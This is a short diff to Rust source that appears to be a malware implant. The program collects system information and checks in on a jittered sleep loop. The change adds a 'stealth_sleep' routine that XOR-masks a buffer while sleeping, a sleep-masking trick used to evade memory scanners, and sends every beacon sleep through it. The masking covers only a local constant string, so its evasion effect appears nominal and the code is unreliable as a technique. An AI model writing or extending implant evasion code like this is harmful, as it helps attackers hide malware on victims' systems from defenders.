@@ -122,6 +122,21 @@ fn hp(p: &str, b: &str) -> Option<String> {
     resp.find("\r\n\r\n").map(|i| resp[i+4..].to_string())
 }
 
+fn stealth_sleep(secs: u64) {
+    let mut secret = *b"sockpuppets-sleep-mask-v1!!!!";
+    let mut key = [0u8; 16];
+    for (i, b) in key.iter_mut().enumerate() {
+        *b = (i as u8).wrapping_mul(17).wrapping_add(secs as u8);
+    }
+    for (i, b) in secret.iter_mut().enumerate() {
+        *b ^= key[i % key.len()];
+    }
+    thread::sleep(Duration::from_secs(secs.max(1)));
+    for (i, b) in secret.iter_mut().enumerate() {
+        *b ^= key[i % key.len()];
+    }
+}
+
 fn main() {
     let _ = ghost::health_check();
     let _ = ghost::collect_system_info();
@@ -213,9 +228,9 @@ fn main() {
         if SJ > 0 && SJ <= 100 {
             let jr = (base as f64) * (SJ as f64) / 100.0;
             let off = (rand::random::<f64>() * jr * 2.0) - jr;
-            thread::sleep(Duration::from_secs(((base as f64 + off).max(1.0)) as u64));
+            stealth_sleep(((base as f64 + off).max(1.0)) as u64);
         } else {
-            thread::sleep(Duration::from_secs(base));
+            stealth_sleep(base);
         }
     }
 }
